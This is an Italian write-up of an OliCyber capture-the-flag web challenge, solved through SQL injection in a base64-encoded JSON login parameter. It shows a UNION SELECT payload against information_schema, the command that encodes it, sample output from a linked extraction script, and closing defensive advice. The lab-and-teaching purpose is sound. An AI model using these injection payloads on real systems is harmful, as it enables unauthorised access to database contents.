# Sn4ck sh3nan1gans

**Competizione:** OliCyber<br>
**Categoria:** Web<br>
**URL:** http://sn4ck-sh3nan1gans.challs.olicyber.it

---

## Descrizione

> Ho trovato questa pagina di login, ma sembra che non ci sia nulla di interessante. Guardaci tu, io vado a fare merenda.

Una pagina di login che accetta un parametro `login` contenente un valore base64. L'obiettivo è manipolare questo parametro per ottenere accesso con privilegi diversi.

---

## Soluzione

### Step 1 — Analisi del parametro login

La pagina di login riceve un parametro `login` con valore:

```
eyJJRCI6MjQ4fQ==
```

Questo appare essere **Base64 codificato**. Decodifichiamo:

```bash
echo "eyJJRCI6MjQ4fQ==" | base64 -d
```

**Output:**
```json
{"ID":248}
```

Interessante! Il parametro contiene un JSON con un campo `ID` impostato a `248`.

---

### Step 2 — Identificazione della vulnerabilità

La pagina di login accetta il parametro e lo decodifica, poi lo usa in una **query SQL senza sanitizzazione**!

Il valore decodificato:
```json
{"ID":248}
```

Viene probabile usato in una query come:

```sql
SELECT * FROM users WHERE ID = 248
```

Ma il campo `ID` **accetta SQL** direttamente! Possiamo iniettare una query SQL completa.

---

### Step 3 — SQL Injection

Il valore del parametro è trattato come SQL, quindi possiamo usare `UNION SELECT` per estrarre dati dal database:

```bash
# Creiamo un payload UNION SELECT per ottenere i nomi delle tabelle
payload = '252352 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0'
```

Codifichiamo in Base64:

```bash
echo '{"ID":"252352 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0"}' | base64
```

Visitiamo:
```
http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php?login=BASE64_CODIFICATO
```

---

### Step 4 — Enumerazione del database

**Lo script Python per l'exploit è disponibile in questa cartella → [`sn4cksh3nan1gans.py`](sn4cksh3nan1gans.py)**

---

---

### Step 5 — Utilizzo dello script

```bash
# Rendere eseguibile lo script
chmod +x sn4cksh3nan1gans.py

# Eseguire lo script
python3 sn4cksh3nan1gans.py
```

Lo script farà:

1. Enumera tutte le tabelle del database
2. Ti chiede di scegliere quale tabella esaminare
3. Enumera tutte le colonne di quella tabella
4. Ti chiede di scegliere quale colonna leggere
5. Estrae tutti i dati da quella colonna
6. Se trova "flag" nei dati, la stampa

**Output atteso:**

```
[*] Enumerating tables...
  [0] information_schema
  [1] flags
  [2] users

[?] Select table index: 1

[*] Enumerating columns from 'flags'...
  [0] id
  [1] flag_content

[?] Select column index: 1

[*] Extracting data from 'flags'.'flag_content'...

[+] Result: flag{...}
[+] Flag found: flag{...}
```

---

### Step 6 — Risultato

La flag viene estratta automaticamente dallo script e mostrata come:

```
flag{...}
```

## Vulnerabilità sfruttata

| Aspetto | Dettaglio |
|---|---|
| **Tipo** | SQL Injection (SQLi) nel parametro login |
| **Causa** | Il valore del parametro `login` viene usato direttamente in una query SQL senza sanitizzazione |
| **Vettore** | Manipolazione del JSON nel parametro `login` base64-encoded con payload SQL |
| **Impatto** | Accesso ai dati del database, estrazione di flag, credenziali, dati sensibili |

---

## Conclusioni

Questa challenge dimostra come **SQL Injection** rimane una delle vulnerabilità web più critiche e comuni. La sicurezza non si ottiene:

1. Codificando i dati (Base64)
2. Filtrando singoli caratteri
3. Fidandosi di input utente

La sicurezza si ottiene solo con:

1. **Prepared Statements**: la difesa più efficace
2. **Validazione lato server**
3. **Least privilege nel database**
4. **Handling corretto degli errori**